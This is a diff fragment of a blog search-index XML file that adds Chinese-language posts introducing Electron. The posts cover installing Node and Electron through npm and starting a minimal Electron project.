+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>Electron 是 GitHub 发布的跨平台桌面应用开发工具，基于 Chromium 和 Node.js, 让你可以使用 HTML, CSS 和 JavaScript 构建应用，兼容 Mac、Windows 和 Linux，可以构建出三个平台的应用程序。</p>
+</blockquote>
+<a id="more"></a>
+
+<h5 id="搭建Electron开发环境"><a href="#搭建Electron开发环境" class="headerlink" title="搭建Electron开发环境"></a>搭建Electron开发环境</h5><h6 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h6><p>到<a href="https://nodejs.org/en/">node官网</a>安装node.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看是node否安装成功</span></span><br><span class="line">node -v</span><br></pre></td></tr></table></figure>
+
+<h6 id="安装Electron"><a href="#安装Electron" class="headerlink" title="安装Electron"></a>安装Electron</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install electron -g</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看electron是否安装成功</span></span><br><span class="line">electron -v</span><br><span class="line"></span><br><span class="line"><span class="comment">// 升级electron</span></span><br><span class="line">npm update electron -g</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载electron</span></span><br><span class="line">npm uninstall electron</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="创建第一个Electron应用"><a href="#创建第一个Electron应用" class="headerlink" title="创建第一个Electron应用"></a>创建第一个Electron应用</h5><h6 id="核心文件："><a href="#核心文件：" class="headerlink" title="核心文件："></a>核心文件：</h6><p>一个最小的Electron工程至少需要三个文件</p>
+<ul>
+<li>package.json：Electron工程配置文件</li>
+<li>index.js：Electron工程入口点</li>
+<li>index.html：用于主窗口UI的页面文件</li>
+</ul>
+<h6 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h6><ol>
+<li><p>创建项目目录</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mkdir electron-demo</span><br><span class="line">cd electron-demo</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建<code>package.json</code>文件</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm init -y  <span class="comment">// 生成工程默认的package.json文件</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>桌面端</category>
+      </categories>
+      <tags>
+        <tag>electron</tag>
+        <tag>桌面端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Electron</title>
+    <url>/20201016/033734.html</url>
+    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
+<p>Electron 是 GitHub 发布的跨平台桌面应用开发工具，基于 Chromium 和 Node.js, 让你可以使用 HTML, CSS 和 JavaScript 构建应用，兼容 Mac、Windows 和 Linux，可以构建出三个平台的应用程序。</p>
+</blockquote>
+<a id="more"></a>
+
+]]></content>
+      <categories>
+        <category>桌面端</category>
+      </categories>
+      <tags>
+        <tag>electron</tag>
+        <tag>桌面端</tag>
       </tags>
   </entry>
   <entry>
